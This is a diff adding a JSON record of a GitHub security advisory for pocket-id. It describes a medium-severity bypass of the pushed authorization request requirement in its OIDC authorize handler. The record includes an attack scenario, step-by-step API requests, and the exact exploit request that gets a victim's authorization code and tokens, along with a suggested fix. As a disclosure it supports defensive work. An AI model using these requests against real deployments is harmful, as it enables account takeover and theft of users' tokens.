@@ -1,0 +1,44 @@
+{
+  "global": null,
+  "id": "GHSA-fg8g-5j43-phc5",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 4.3,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [],
+    "description": "`backend/internal/oidc/authorization_handler.go:61` decides \"this is a PAR request\" from\r\n`c.Query(\"request_uri\")` - the query string only. Fosite resolves it from `r.Form`\r\n(the merged query+body map, where the POST body wins on duplicate keys:\r\nfork `authorize_request_handler.go:388`, `pushed_authorize_request_handler.go:59`).\r\nOne request can therefore carry two values: a PAR-prefixed `request_uri` in the query\r\n(guard satisfied → PAR assumed) and an empty `request_uri` in the body (fosite sees\r\nno PAR session → plain front-channel flow). No PAR session is created, looked up, or\r\nconsumed. Reproduced on public+PKCE and confidential PAR clients; `GET /authorize`\r\nhas no body so the shadow is not constructible there.\r\n\r\n## Attack scenario\r\nAttacker operates a registered OIDC client with PAR required. Victim with an active\r\nIdP session visits one crafted auto-POST (single visit, zero clicks - prompt=none +\r\nskipConsent). A code is issued to the attacker's redirect_uri and redeemed for\r\naccess + ID + refresh tokens as the victim.\r\n\r\n## Steps to reproduce (from zero, ~2 min)\r\nPrereq: clean `ghcr.io/pocket-id/pocket-id:v2.14.0` with `APP_URL=http://127.0.0.1:1412`\r\n(fresh volume - setup must be uncompleted). A copy-paste script is attached\r\n(`repro-f002-par-bypass.sh`; run `./repro-f002-par-bypass.sh http://127.0.0.1:1412`).\r\n\r\n1. Create the initial admin (returns admin session cookie):\r\n   `POST /api/signup/setup`\r\n   `{\"username\":\"admin\",\"email\":\"admin@lab.local\",\"firstName\":\"Lab\",\"lastName\":\"Admin\"}`\r\n2. Create a victim (admin session):\r\n   `POST /api/users` `{\"username\":\"victim\",\"email\":\"victim@lab.local\",\"firstName\":\"Vic\",\"lastName\":\"Tim\"}`\r\n   → note `id`.\r\n3. Mint + exchange a one-time-access token for the victim (admin session, then anonymous):\r\n   `POST /api/users/<victim-id>/one-time-access-token` `{\"ttl\":\"15m\"}` → `{\"token\":\"…\"}`;\r\n   `POST /api/one-time-access-token/<token>` → victim session cookie.\r\n4. Register the attacker client (admin session):\r\n   `POST /api/oidc/clients`\r\n   `{\"name\":\"repro-par\",\"callbackURLs\":[\"https://app.lab.local/cb\"],\"isPublic\":true,\"pkceEnabled\":true,\"requiresPushedAuthorizationRequests\":true,\"skipConsent\":true}`\r\n   → note client `id`.\r\n5a. CONTROL - victim session:\r\n   `POST /authorize` with form body\r\n   `client_id=<id>&response_type=code&redirect_uri=https%3A%2F%2Fapp.lab.local%2Fcb&scope=openid+profile&state=st0123456789abcdef&prompt=none&code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM&code_challenge_method=S256`\r\n   → `303` to `…/cb?error=error&error_description=The+error+is+unrecognizable` (PAR guard fires).\r\n5b. EXPLOIT - identical request, but URL is\r\n   `/authorize?request_uri=urn:ietf:params:oauth:request_uri:shadow`\r\n   and the body is prefixed with `request_uri=&`\r\n   → `303` to `https://app.lab.local/cb?code=pocket_id_ac_…&scope=openid+profile&state=…`\r\n   **authorization code issued, no PAR session ever existed, zero interaction.**\r\n6. Redeem (no secret - public client, RFC 7743 PKCE pair):\r\n   `POST /api/oidc/token`\r\n   `grant_type=authorization_code&code=<code>&redirect_uri=https%3A%2F%2Fapp.lab.local%2Fcb&client_id=<id>&code_verifier=dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk`\r\n   → access + ID + refresh tokens; ID token carries the VICTIM:\r\n   `sub=<victim-id>`, `preferred_username=victim`, `amr=[\"otp\"]`.\r\n\r\nExpected on a fixed build: step 5b behaves like 5a (error, no code).\r\n\r\n## Fix suggestion\r\nRead the same surface fosite reads, e.g. after `ParseForm` use\r\n`c.Request.Form.Get(\"request_uri\")`, or reject requests carrying `request_uri`\r\nin both query and body.\r\n",
+    "ghsa_id": "GHSA-fg8g-5j43-phc5",
+    "html_url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-fg8g-5j43-phc5",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-fg8g-5j43-phc5"
+      }
+    ],
+    "published_at": "2026-09-19T18:50:46Z",
+    "references": [],
+    "severity": "medium",
+    "summary": "PAR requirement bypass: front-channel authorize accepted for PAR-pinned clients due to query-only `request_uri` check",
+    "updated_at": "2026-09-19T18:50:46Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/pocket-id/pocket-id/backend"
+        },
+        "patched_versions": "v2.15.0",
+        "vulnerable_version_range": ">= 2.10.0, <= 2.14.0"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "pocket-id/pocket-id"
+}
